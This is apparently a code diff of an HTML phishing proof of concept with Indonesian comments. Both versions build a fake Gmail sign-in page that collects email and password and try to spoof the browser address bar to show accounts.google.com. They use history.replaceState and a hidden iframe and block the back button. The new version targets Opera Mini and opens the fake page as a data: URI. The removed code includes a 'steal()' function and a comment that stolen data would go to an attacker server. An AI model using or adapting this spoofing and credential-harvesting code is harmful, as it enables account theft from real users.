@@ -1,69 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Sign-in</title>
-<style>
-    /* Styling dibuat mirip Google */
-    body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .container { width: 100%; max-width: 360px; padding: 20px; text-align: center; }
-    .logo { width: 80px; margin-bottom: 10px; }
-    h2 { font-weight: 400; font-size: 24px; margin-bottom: 5px; }
-    p { font-size: 15px; color: #202124; margin-bottom: 30px; }
-    input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none;}
-    input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-    .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opera Mini Spoof Trigger</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        button { background: #d32f2f; color: white; padding: 20px 40px; font-size: 20px; border: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        button:active { background: #b71c1c; }
+    </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Logo Gmail Resmi -->
-    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo">
-    <h2>Sign in</h2>
-    <p>to continue to Gmail</p>
+    <h2 style="margin-bottom: 20px;">Address Bar Spoof Test</h2>
+    <button onclick="executeExploit()">JALANKAN EXPLOIT</button>
 
-    <input type="text" id="email" placeholder="Email or phone" autocomplete="off">
-    <input type="password" id="password" placeholder="Password" autocomplete="off">
-    
-    <button class="btn" onclick="steal()">Next</button>
-</div>
+    <script>
+        function executeExploit() {
+            // HTML untuk UI Palsu (Google Login) yang dimasukkan ke Data URI
+            var payload = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Sign in - Google Accounts</title>
+                <style>
+                    body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; padding: 0; text-align: center; }
+                    .container { max-width: 400px; margin: 0 auto; padding-top: 50px; }
+                    .logo { width: 100px; margin-bottom: 20px; }
+                    h2 { font-weight: 400; font-size: 24px; margin-bottom: 5px; }
+                    p { font-size: 15px; color: #202124; margin-bottom: 30px; }
+                    input { width: 85%; padding: 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
+                    input:focus { border: 2px solid #1a73e8; padding: 14px; }
+                    .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: bold; float: right; margin-right: 7.5%; margin-top: 10px; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo">
+                    <h2>Sign in</h2>
+                    <p>to continue to Gmail</p>
+                    <input type="text" id="email" placeholder="Email or phone" autocomplete="off">
+                    <input type="password" id="password" placeholder="Password" autocomplete="off">
+                    <button class="btn" onclick="alert('POC SUKSES! Data ditangkap: ' + document.getElementById('email').value)">Next</button>
+                </div>
 
-<script>
-    // --- LOGIKA EKSPLOITASI ---
+                <script>
+                    // LOGIKA RACE CONDITION & SPOOFING
+                    
+                    // 1. Manipulasi History agar URL Bar berubah ke Google
+                    try {
+                        history.replaceState({}, '', 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com');
+                    } catch(e) {}
 
-    // 1. CEK: Jika halaman ini dibuka sebagai Data URI (bukan file html biasa)
-    // Kita akan memancing Address Bar agar menampilkan URL Google.
-    if (window.location.protocol === 'data:') {
-        
-        // Trik 1: Gunakan history.replaceState (jika diizinkan)
-        try {
-            // Ubah URL di Address Bar tanpa reload halaman
-            window.history.replaceState({}, '', 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com');
-        } catch (e) {
-            // Trik 2: Gunakan Object untuk navigasi "siluman"
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'https://accounts.google.com'; // Memancing browser membaca domain Google
-            document.body.appendChild(iframe);
+                    // 2. Fallback Skeleton Iframe (Untuk Opera Mini)
+                    // Hanya dijalankan jika replaceState gagal
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'https://accounts.google.com';
+                    document.body.appendChild(iframe);
+
+                    // 3. Anti Back
+                    history.pushState(null, null, location.href);
+                    window.onpopstate = function () { history.pushState(null, null, location.href); };
+                <\/script>
+            </body>
+            </html>
+            `;
+
+            // Encode ke Data URI
+            var dataUri = "data:text/html;charset=utf-8," + encodeURIComponent(payload);
+
+            // Buka di tab baru
+            var w = window.open(dataUri, "_blank");
+            if (!w) {
+                alert("Popup diblokir! Tolong izinkan popup di Opera Mini.");
+            }
         }
-    }
-
-    // 2. Kunci History (Anti Back)
-    history.pushState(null, null, location.href);
-    window.onpopstate = function () { history.pushState(null, null, location.href); };
-
-    // 3. Fungsi Pencurian Data
-    function steal() {
-        var e = document.getElementById('email').value;
-        var p = document.getElementById('password').value;
-        
-        if(!e || !p) { alert("Isi dulu!"); return; }
-        
-        // Tampilkan bukti (di dunia nyata, kirim via fetch ke server attacker)
-        alert("🔥 DATA DICURI 🔥\n\nEmail: " + e + "\nPassword: " + p + "\n\nCek Address Bar di atas!");
-    }
-</script>
+    </script>
 </body>
 </html>
